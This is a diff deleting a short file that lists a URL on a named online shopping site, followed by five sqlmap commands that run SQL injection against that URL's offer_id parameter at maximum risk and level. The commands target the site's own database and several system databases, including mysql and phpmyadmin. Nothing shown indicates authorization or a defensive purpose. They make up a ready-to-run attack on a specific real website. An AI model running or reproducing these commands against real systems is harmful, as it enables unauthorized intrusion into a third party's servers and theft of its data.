@@ -1,6 +1,0 @@
-https://www.indiashoppers.in/redirect.php?offer_id=11837
-python ../sqlmap/sqlmap.py -u https://www.indiashoppers.in/redirect.php?offer_id=11837 --risk 3 --level 5 --batch -D indiashoppers
-python ../sqlmap/sqlmap.py -u https://www.indiashoppers.in/redirect.php?offer_id=11837 --risk 3 --level 5 --batch -D information_schema
-python ../sqlmap/sqlmap.py -u https://www.indiashoppers.in/redirect.php?offer_id=11837 --risk 3 --level 5 --batch -D mysql
-python ../sqlmap/sqlmap.py -u https://www.indiashoppers.in/redirect.php?offer_id=11837 --risk 3 --level 5 --batch -D performance_schema
-python ../sqlmap/sqlmap.py -u https://www.indiashoppers.in/redirect.php?offer_id=11837 --risk 3 --level 5 --batch -D phpmyadmin
